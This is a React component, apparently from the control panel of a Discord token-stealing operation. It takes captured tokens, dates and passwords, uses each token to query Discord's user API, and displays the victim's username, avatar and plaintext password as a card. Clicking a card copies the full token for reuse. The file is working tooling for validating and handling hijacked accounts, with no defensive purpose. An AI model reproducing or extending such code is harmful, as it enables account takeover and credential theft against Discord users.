import { useState, useEffect } from 'react';
import axios from 'axios';
import dayjs from 'dayjs';

const GotTokens = ({token, date, password}) => {
	const [user, setUser] = useState(null);
	useEffect(() => {
		const fetchUsers = async () => {
			const tk = await axios.get('https://discord.com/api/v9/users/@me', {
				headers: {
					Authorization: token
				}
			});
			setUser(tk.data);

		}
		fetchUsers();
	}, [token]);

	const copyToken = (tk) => {
		navigator.clipboard.writeText(tk);
	}

	return (
		<>
		{
			user ? 
				<div className="token-card" onClick={() => copyToken(token)}>
					<span className="token-info">{token.slice(0, 14) + "..."}</span>
					<div className="token-card-header">
						<h3>{user.username}#{user.discriminator}</h3>
					</div>
					<div className="token-card-body">
						<img
							alt={user.username + "#" + user.discriminator} 
							src={user.avatar ? "https://cdn.discordapp.com/avatars/" + user.id + "/" + user.avatar : "https://art.pixilart.com/90c3f59fa4f6b67.png"} 
						/>
					</div>
					<div>
						<p><span>$psw:</span> {password !== null ? password : "Nope"}</p>
						<p>{dayjs(date).format("MM/DD/YYYY")}</p>
					</div>
				</div>
			: ""
		}
		</>
	)
}

export default GotTokens;